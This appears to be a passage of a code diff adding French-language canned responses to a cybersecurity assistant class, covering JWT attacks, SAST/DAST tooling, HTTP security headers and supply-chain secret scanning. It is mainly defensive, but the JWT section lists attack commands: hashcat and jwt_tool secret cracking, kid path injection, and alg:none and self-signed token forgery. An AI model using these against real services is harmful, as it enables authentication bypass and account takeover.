+                "     hashcat -a 0 -m 16500 <jwt> wordlist.txt\n"
+                "     jwt_tool <token> -C -d wordlist.txt\n\n"
+                "  4. kid injection\n"
+                "     kid: '../../dev/null'  → clé vide\n\n"
+                "  5. Claim pollution\n"
+                "     Modifier sub/role/exp dans le payload\n\n"
+                "OUTIL : jwt_tool (ticarpi/jwt_tool)\n"
+                "  jwt_tool <token> -T          → tamper\n"
+                "  jwt_tool <token> -X a        → alg:none\n"
+                "  jwt_tool <token> -X s        → self-signed\n\n"
+                "REMÉDIATION :\n"
+                "  Forcer l'algorithme côté serveur (pas client)\n"
+                "  Durée courte (< 15min) + refresh tokens\n"
+                "  Valider toutes les claims\n"
+                "  Ne pas stocker de données sensibles dans le payload",
+                {"domain": "dev_secure", "vuln": "jwt"})
+
+        if any(kw in t for kw in ["sast", "dast", "sonarqube", "semgrep", "snyk", "revue de code", "code review"]):
+            return self._result(True,
+                "🛡️  Analyse de code sécurisé (SAST/DAST)\n\n"
+                "SAST — Analyse statique (boîte blanche) :\n"
+                "  semgrep --config auto .         → multi-langages\n"
+                "  bandit -r . -l                  → Python\n"
+                "  sonarqube                       → CI/CD intégré\n"
+                "  eslint-plugin-security          → JavaScript\n"
+                "  brakeman                        → Ruby on Rails\n"
+                "  gosec ./...                     → Go\n"
+                "  snyk code test                  → multi-langages\n\n"
+                "DAST — Analyse dynamique (boîte noire) :\n"
+                "  OWASP ZAP     → scan automatique web\n"
+                "  Nikto         → vulnérabilités web\n"
+                "  Nuclei        → templates CVE\n\n"
+                "SCA — Composants vulnérables :\n"
+                "  snyk test                       → dépendances\n"
+                "  owasp-dependency-check          → CVE dépendances\n"
+                "  trivy fs .                      → scan filesystem\n"
+                "  pip-audit / npm audit           → Python/JS\n\n"
+                "SECRET SCANNING :\n"
+                "  trufflehog git <repo>           → historique git\n"
+                "  gitleaks detect                 → secrets dans code\n"
+                "  git-secrets                     → pre-commit hook",
+                {"domain": "dev_secure", "skill": "sast_dast"})
+
+        if any(kw in t for kw in ["api security", "sécurité api", "cors", "csp", "headers"]):
+            return self._result(True,
+                "🛡️  Sécurité API & En-têtes HTTP\n\n"
+                "EN-TÊTES SÉCURITÉ ESSENTIELS :\n"
+                "  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n"
+                "  Content-Security-Policy: default-src 'self'\n"
+                "  X-Content-Type-Options: nosniff\n"
+                "  X-Frame-Options: DENY\n"
+                "  Referrer-Policy: strict-origin-when-cross-origin\n"
+                "  Permissions-Policy: camera=(), microphone=()\n\n"
+                "CORS SÉCURISÉ :\n"
+                "  Access-Control-Allow-Origin: https://app.trusted.com  (pas *)\n"
+                "  Access-Control-Allow-Credentials: true  → jamais avec *\n"
+                "  Vérifier côté serveur l'origine\n\n"
+                "OWASP API TOP 10 :\n"
+                "  API1  : BOLA (Broken Object Level Auth) — IDOR\n"
+                "  API2  : Auth cassée\n"
+                "  API3  : Object Property exposure (mass assignment)\n"
+                "  API4  : Resource consumption (pas de rate limit)\n"
+                "  API5  : BFLA (Function Level Auth)\n"
+                "  API8  : Security misconfiguration\n"
+                "  API10 : Unsafe API consumption\n\n"
+                "TESTER :\n"
+                "  securityheaders.com → analyser les headers\n"
+                "  Postman / Insomnia  → tester API\n"
+                "  OWASP ZAP API scan",
+                {"domain": "dev_secure", "skill": "api_security"})
+
+        if any(kw in t for kw in ["supply chain", "dependency confusion", "trufflehog", "gitleaks", "secret"]):
+            return self._result(True,
+                "🛡️  Supply Chain & Secrets Scanning\n\n"
+                "ATTAQUES SUPPLY CHAIN :\n"
+                "  Dependency Confusion\n"
+                "    Publier un paquet malveillant sur PyPI/npm avec le même nom\n"
+                "    que des paquets internes privés (score de version plus élevé)\n\n"
+                "  Typosquatting : requests vs requets, numpy vs numply\n\n"
+                "  SolarWinds-style : compromission du pipeline CI/CD\n\n"
+                "PROTECTION :\n"
+                "  pip install --index-url https://repo.interne.fr/ paquet\n"
+                "  npm config set registry https://registry.interne.fr/\n"
+                "  Pinning de versions exactes + hash (pip hash, npm lockfile)\n"
+                "  SBOM (Software Bill of Materials) : syft . -o spdx\n\n"
+                "SECRET SCANNING :\n"
+                "  trufflehog git https://github.com/org/repo  → historique git\n"
+                "  gitleaks detect --source .                  → local\n"
+                "  gitleaks protect --staged                   → pre-commit\n"
+                "  github.com secret scanning (natif GitHub)\n\n"
+                "PRE-COMMIT HOOKS :\n"
+                "  pre-commit install\n"
+                "  .pre-commit-config.yaml : detect-secrets, gitleaks, bandit",
+                {"domain": "dev_secure", "skill": "supply_chain"})
+
+        return self._result(True,
+            "🛡️  Développement Sécurisé — Domaines couverts\n\n"
+            "  owasp top 10      → les 10 vulnérabilités web principales\n"
+            "  injection sql     → SQLi — détection et remédiation\n"
+            "  xss               → Cross-Site Scripting\n"
+            "  ssrf              → Server-Side Request Forgery\n"
+            "  jwt               → attaques JWT et sécurisation\n"
+            "  sast / code review→ analyse statique et outils\n"
+            "  api security      → headers HTTP, CORS, OWASP API\n"
+            "  supply chain      → dependency confusion, secrets\n\n"
+            "Précise la vulnérabilité ou le contexte pour un guide détaillé.",
+            {"domain": "dev_secure"})
 
 
 cyber_agent = CyberAgent()
